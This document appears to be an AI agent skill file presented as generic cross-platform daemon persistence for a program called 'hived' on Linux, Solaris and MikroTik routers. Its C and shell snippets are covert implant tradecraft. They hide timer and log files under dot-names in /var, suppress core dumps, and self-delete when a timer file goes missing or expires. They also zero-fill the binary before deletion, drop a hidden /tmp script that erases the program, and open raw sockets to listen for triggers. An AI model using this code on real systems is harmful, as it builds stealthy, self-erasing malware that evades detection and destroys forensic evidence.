---
name: cross-platform-persistence
description: "Use when: implementing daemon persistence across Linux, Solaris, and MikroTik platforms with platform-specific daemonization. Triggers: 'daemon persistence', 'service init', 'autostart', 'systemd', 'init script', 'core dump prevention'. NOT for: single-platform only (use platform-specific skills), or when daemon isn't required."
---

# Cross-Platform Daemon Persistence

## Overview

Pattern for deploying long-running daemons across heterogeneous platforms (Linux, Solaris, MikroTik RouterOS) with platform-specific initialization, persistence mechanisms, and lifecycle management.

## Platform-Specific Daemonization

### Linux
```c
#include <unistd.h>
void daemonize() {
    daemon(0, 0);  // glibc wrapper
}
```

### Solaris / uClibc (Manual Double-Fork)
```c
void daemonize() {
    pid_t pid = fork();
    if (pid > 0) exit(0);       // Parent exits
    if (pid < 0) exit(1);

    setsid();                    // New session

    pid = fork();                // Second fork
    if (pid > 0) exit(0);

    chdir("/");
    close(STDIN_FILENO);         // Close standard FDs
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Redirect to /dev/null
    int fd = open("/dev/null", O_RDWR);
    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);

    // Prevent core dumps
    struct rlimit rl = {0, 0};
    setrlimit(RLIMIT_CORE, &rl);
}
```

## Platform-Specific Init Scripts

### MikroTik RouterOS
```bash
# /rw/pckg/hived &  (package directory)
# Or via /etc/rc.d/run.d/S99hived
```

### Solaris
```bash
# /etc/init.d/hived
# Symlink from /etc/rc3.d/S99hived
# Uses getexecname() to determine binary path
```

### Linux (Standard)
```bash
# /etc/init.d/hived or systemd service
# Uses /proc/self/exe for binary path
```

## Timer-File Persistence

```c
#define TIMER_FILE "/var/.config"
#define LOG_FILE "/var/.log"

// Touch timer file on successful beacon/trigger
void update_file(char *filepath) {
    utime(filepath, NULL);  // Update mtime to now
}

// Check timer against configured delay
void check_timer(char *filepath, unsigned long delete_delay) {
    struct stat st;
    if (stat(filepath, &st) < 0) {
        // Timer file missing -- tamper detected
        self_delete();
        exit(0);
    }
    time_t timediff = time(NULL) - st.st_mtime;
    if (timediff > (time_t)delete_delay) {
        markTermination(filepath);
        self_delete();
    }
}

// Write termination timestamp for forensics
void markTermination(char *filepath) {
    FILE *f = fopen(filepath, "w");
    time_t now = time(NULL);
    struct tm t = *localtime(&now);
    char ts[20];
    strftime(ts, 20, "%y%m%d%H%M%S", &t);
    fprintf(f, "%s\n", ts);
    fclose(f);
}
```

## Platform-Specific Self-Delete

### Linux
```c
void self_delete() {
    char self[512];
    readlink("/proc/self/exe", self, 511);
    // Zero-fill the binary
    int fd = open(self, O_WRONLY);
    struct stat sb;
    fstat(fd, &sb);
    for (int i = 0; i < sb.st_size; i++) write(fd, "\0", 1);
    close(fd);
    remove(self);
    exit(0);
}
```

### Solaris
```c
void self_delete() {
    char *self = (char *)getexecname();
    // Create shell script to delete binary
    FILE *f = fopen("/tmp/.configure.sh", "w");
    fprintf(f, "#!/bin/sh\n");
    fprintf(f, "/bin/rm -f %s\n", self);
    fprintf(f, "/bin/rm -f $0\n");
    fclose(f);
    system("chmod +x /tmp/.configure.sh");
    execl("/bin/sh", "/bin/sh", "-c", "/tmp/.configure.sh &", NULL);
    exit(0);
}
```

## Raw Socket Initialization (Platform-Specific)

### Linux
```c
int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
```

### Solaris
```c
// Requires -I <interface> flag (e.g., hme0, e1000g0)
int sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
// Must bind to specific interface
```

## Constraints

- MUST use double-fork pattern on Solaris/uClibc (no `daemon()` available)
- MUST set RLIMIT_CORE to 0 on Solaris to prevent core dumps
- MUST use `getexecname()` on Solaris (no `/proc/self/exe`)
- MUST require interface flag (`-I`) on Solaris for raw socket binding
- MUST use `utime(NULL)` to touch timer file (not `touch` command)
- SHOULD check timer every 100 packets (not every packet) for performance
- MUST handle missing timer file as tamper-detection → immediate self-delete
- ALWAYS write termination timestamp before self-delete for operational forensics
- NEVER leave core dumps on Solaris systems (contains sensitive data)
